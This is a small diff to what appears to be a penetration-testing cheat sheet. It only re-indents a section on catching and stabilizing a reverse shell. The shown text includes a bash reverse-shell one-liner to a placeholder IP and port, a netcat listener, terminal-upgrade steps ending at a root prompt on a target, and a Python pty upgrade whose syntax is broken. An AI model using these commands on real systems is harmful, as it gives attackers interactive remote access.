@@ -17,10 +17,10 @@ bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"
   chuxtr@kali$ stty raw -echo; fg
   nc -lnvp 1337
             reset
-reset: unknown terminal type unknown
-Terminal type? screen
-root@target:/backend#
-```
+  reset: unknown terminal type unknown
+  Terminal type? screen
+  root@target:/backend#
+  ```
 * ** Python Shell Upgrade
   ```bash
   python -c ('import pty; pty.spawn("/bin/bash")'
